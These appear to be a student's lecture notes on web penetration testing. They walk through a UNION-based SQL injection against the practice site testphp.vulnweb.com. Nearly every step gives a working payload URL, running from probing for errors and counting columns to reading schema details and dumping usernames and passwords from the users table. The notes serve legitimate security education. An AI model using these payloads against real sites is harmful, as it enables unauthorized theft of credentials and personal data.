#WAPT #penetration-testing
### Overview
- exploiting via SQL injection , how we can change the name of database , which database using , table name , column name , sensitive details like username & password ✔ 
### what we'll learn
- how to get information from the application's database via SQL injection

### Topics - Explanation

1) <u>Overview Explanation</u>
	- testphp.vulnweb.com/artists.php : this is a website where we're gonna apply SQL injection
	- so it's vulnerable parameter is `http://testphp.vulnweb.com/artists.php?artist=1` 
	- STEP 1: Ques : how do Anuj sir got to know that's the vulnerable parameter ? ✅
		- Ans : when u put a single quote after that `artist=1` like this `artist=1'`
		- & hit enter , then it's throwing an error/exception ![[WAPT-lecture-21-0.jpg]]
		- & it's showing location i.e `/hj/var/www/artists.php on line 62`
	- STEP 2: `imp note ⭐` : whenever you feel that u got the vulnerable parameter on which we can perform SQL injection then try to find out the `how many columns have in the application`  
		- so checking for 1st column `http://testphp.vulnweb.com/artists.php?artist=1 order by 1` , we'll get something as a output ![[WAPT-lecture-21-1.jpg]]
		- so way give for 2nd column then 3rd column , so increase the columns to check on which column we're getting error ✔
		- STEP 2.2 : so write for 2nd column `http://testphp.vulnweb.com/artists.php?artist=1 order by 2` , so again we'll get output
		- STEP 2.3 : checking for 3rd column `http://testphp.vulnweb.com/artists.php?artist=1 order by 3` , so again we'll get output
		- STEP 2.4: checking for 4th column `http://testphp.vulnweb.com/artists.php?artist=1 order by 4` , so again we'll get error ✔ ![[WAPT-lecture-21-2.jpg]]
		- which means this application contain only 3 columns (means web pages) ✔
	- STEP 3: checking which columns are reflecting/coming & which are not
		- using `union` command to combine those columns which were giving output
		- STEP 3.1: so `http://testphp.vulnweb.com/artists.php?artist=1 union select 1,2,3` , here total 3 columns given cuz the application contain only 3 columns , so hit enter & u'll get the output as same as previous one ✔
		- so same output is coming cuz due to 1 i.e `artist=1` , so we'll query or do changes in the URL, so that it gets break - means expected output will not come ✔
		- STEP 3.2: if u put a single quote `http://testphp.vulnweb.com/artists.php?artist=1' union select 1,2,3`, output : still getting the same error
		- so we'll give something different which is not expected encode (like 1 , 2 , 3 , 4 & so on..) , so we'll give `-1` ✔
		- STEP 3.3: `http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,3` , so output ![[WAPT-lecture-21-3.jpg]]
		- in URL we gave `1,2,3` but here 2 & 3 columns are coming but `1` column is not coming , so output of 2nd & 3rd column is coming 
		- STEP 3.4: in order to check more clearly , so write something custom on each column i.e `http://test.php.vulnweb.com/artists.php?artist=1 union select "ace","ethical","sharmaji"` & output ![[WAPT-lecture-21-4.jpg]]
		- so for 2nd column "ethical" & 3rd column "sharmaji" are reflecting/coming , so we got to know which columns are reflecting ✔
	- STEP 4: finding database via finding which column is using database
		- so we directly put `database()` on 2nd column without checking cuz to save the time
		- STEP 4.1: put this parameter `http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,database(),3` , output ![[WAPT-lecture-21-5.jpg]]
		- so we got the database name `acuart`
		- & in order to play with this webapp , then only change 2nd & 3rd column cuz these are 2 which gives output
	- STEP 5: finding version & current user
		- STEP 5.1: `http://testphp.vulnweb.com/artists.php?artist=-1 union select 1 ,version(),current_user()` & hit enter , output ![[WAPT-lecture-21-6.jpg]]
		- STEP 5.1: taking out more information , pass these parameters `http://testphp.vulnweb.com/artists.php?artist=-1 union select 1, table_name,3 from information_schema.tables where table_schema=database() limit 0,1` , here `0,1` means return `1st` value , output ![[WAPT-lecture-21-7.jpg]]
		- means 1st table name is "artists" , same way u can change the limit in URL like `limit 1,1` then u'll get "carts"
		- STEP 5.2: but finding each columns individually via passing numbers will be difficult , so run this query `http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()`
		- so `group_concat()` will concat all table names & show them , so output ![[WAPT-lecture-21-8.jpg]]
	- STEP 6: taking out `users`  sensitive data
		- STEP 6.1: run this `http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'`
		- means we're retrieving columns of users table via `group_concat()` ✔
		- output : we'll get `uname,pass,cc,address,email,name,phone,cart`
	- STEP 7: taking out username & password
		- STEP 7.1: use this parameter `http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(uname),3 from users`
		- so this will show all the usernames , hit enter & output : test - cuz we have only 1 username in the database
		- STEP 7.2: to get all the passwords of all usernames , `http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(pass),3 from users` , output : pass
		- STEP 7.3: to show all usernames & passwords altogether `http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(uname,"::",pass),3 from users` , output : test::test
### Summary
1) checking the webapp whether it's vulnerable or not by putting a single quote
2) checking number of columns in the application
3) checking which columns are reflecting/coming & which are not coming reflecting
4) finding database via finding which column is using/connected with database
5) finding version of tech used in application + current user
6) taking out users sensitive data
7) taking out all usernames & passwords
